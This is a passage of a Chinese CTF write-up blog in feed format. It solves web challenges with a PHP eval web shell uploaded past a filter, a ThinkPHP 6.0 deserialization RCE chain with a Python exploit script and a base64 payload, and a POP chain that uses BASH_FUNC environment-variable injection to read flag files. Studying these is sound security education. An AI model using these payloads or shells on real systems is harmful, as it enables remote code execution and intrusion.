class="string">&quot;恶意后缀哦&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到我们其实不用考虑文件的后缀名直接看过滤的文件内容即可<br>不能有  <strong>&lt;?php</strong><br>直接构造 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>后缀写成txt都行上传后 利用文件包含 解析 连接</p><h1 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h1><blockquote><p>目录扫描得到 <a href="http://www.zip/">www.zip</a> 源码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RT，一个很简单的Web，给大家送一点分,再送三只生蚝，过年一起吃生蚝哈&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_decode</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">      <span class="variable">$right</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;left&#x27;</span>];</span><br><span class="line">      <span class="variable">$left</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;right&#x27;</span>];</span><br><span class="line">      </span><br><span class="line"><span class="variable">$key</span> = (<span class="keyword">string</span>)@<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$right</span> !== <span class="variable">$left</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$right</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$left</span>))&#123;</span><br><span class="line">          </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Congratulations on getting your first oyster&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster1.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">          </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;603THINKPHP&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">&quot;！！！Oysters don&#x27;t want you to eat！！！&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;WOW！！！Congratulations on getting your second oyster&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../Oyster2.png&#x27;&quot;</span>.<span class="string">&quot;/&gt;&quot;</span>;</span><br><span class="line">          </span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？</span></span><br><span class="line"><span class="comment">//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！</span></span><br><span class="line"><span class="comment">//小Tips：细狗函数┗|｀O′|┛ 嗷~~</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到 是thinkphp6.0  并且设置了一个md5<br>弱比较绕过  直接<strong>s878926199a</strong>   <strong>s155964671a</strong>  两个值可以绕过<br>之后就是preg_match的绕过 可以使用回溯绕过<br>最后 <em><strong>@unserialize($payload);</strong></em>  可以根据提示 找到 thinkphp6.0 存在反序列化漏洞<br>找到exp  可以直接rce<br>这里给出官方wp的相关反序列化代码</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>];</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><blockquote><p>注意代码的: </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>];</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br></pre></td></tr></table></figure><blockquote><p>由于要 回溯  写一段python脚本 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @description: sictf的一次利用thinkphp6 的反序列化漏洞</span></span><br><span class="line"><span class="comment"># @time:2024/2/28</span></span><br><span class="line"><span class="comment"># @author:K1t0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line">url=<span class="string">&quot;url和端口?left=s878926199a&amp;right=s155964671a&quot;</span></span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;A&quot;</span>*<span class="number">1000000</span>+<span class="string">&quot;603THINKPHP&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2R\</span></span><br><span class="line"><span class="string">lbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbA\</span></span><br><span class="line"><span class="string">BleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086M\</span></span><br><span class="line"><span class="string">Tc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtz\</span></span><br><span class="line"><span class="string">OjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODo\</span></span><br><span class="line"><span class="string">iAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE\</span></span><br><span class="line"><span class="string">1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6M\</span></span><br><span class="line"><span class="string">jE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czox\</span></span><br><span class="line"><span class="string">NzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzN\</span></span><br><span class="line"><span class="string">yLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319&quot;</span>&#125;</span><br><span class="line"><span class="comment">#res=session.request(&quot;post&quot;,url,params=params,data=data,headers=headers)  也可以用session的会话来发包</span></span><br><span class="line">res=post(url,data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><blockquote><p>题目描述:<br>看似平平无奇的反序列化题，出题人却在dockerfile里添加了这样一行奇怪命令：RUN ln -sf &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh……<br>RUN ln -sf &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh…… 解释:</p><blockquote><p>这条命令是在Linux系统中创建一个名为sh的软链接，指向&#x2F;bin&#x2F;bash。通过这个命令，将&#x2F;bin&#x2F;sh链接到&#x2F;bin&#x2F;bash上，就相当于将系统中默认的Shell解释器从原本的&#x2F;bin&#x2F;sh改为了&#x2F;bin&#x2F;bash。</p></blockquote></blockquote><blockquote><p>题目代码:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>pop 链很好看出来就是从上到下 直接序列化 好戏在后面<br>唯一要注意的是:</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">          <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个preg_match的绕过 两个方法 </p><blockquote><ol><li>$this-&gt;newyear&#x3D;\nworries</li><li>$this-&gt;newyear&#x3D;Worries    哈哈这个应该再限制一个i的不区分大小写</li></ol></blockquote><p>最后最重要的来了    </p></blockquote><figure class="highlight php"><figcaption><span>public function __isset($name)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>最后一段 其实是利用了 一个 环境变量 的注入,最后执行命令<br>主要是因为 变量设置之后 再执行 bash -c “echo hello”我们可以替换 echo命令的函数<br>从而执行我们想要的命令<br>大致就是这个流程env $’BASH_FUNC_echo%%&#x3D;() { id; }’ bash -c ‘echo hello’<br>因此首先构造</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome=<span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year=<span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year-&gt;newyear=<span class="string">&#x27;Worries&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year-&gt;last=<span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>得到:<br>Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30&#x3D;<br>最后直接发包<br>地址端口&#x2F;?go&#x3D; Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30&#x3D;&amp;get[BASH_FUNC_echo%%]&#x3D;() { cat &#x2F;f*; }  </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>begin-ctf</title>
      <link href="/2024/02/11/begin-ctf-misc-wp/"/>
      <url>/2024/02/11/begin-ctf-misc-wp/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><p><em><strong>begin_ctf-misc-wp</strong></em></p><h1 id="real-check-in"><a href="#real-check-in" class="headerlink" title="real check in"></a>real check in</h1><blockquote><p>MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK&gt;7GEYWWZK7NE3X2&#x3D;&#x3D;&#x3D;<br>签到 直接base32</p></blockquote><h1 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h1><blockquote><p>读取所有txt文件内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @description: find</span></span><br><span class="line"><span class="comment"># @time:2023/2/1</span></span><br><span class="line"><span class="comment"># @author:K1t0</span></span><br><span class="line"></span><br><span class="line">str1=<span class="string">&quot;d:/tupper/&quot;</span></span><br><span class="line">res=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">676</span>,<span class="number">4</span>):</span><br><span class="line">    payload=str1+<span class="built_in">str</span>(i)+<span class="string">&quot;.txt&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(payload,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        info=file.read()</span><br><span class="line">        res+=info</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;d:/1.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span>  file2:</span><br><span class="line">    file2.write(res)</span><br><span 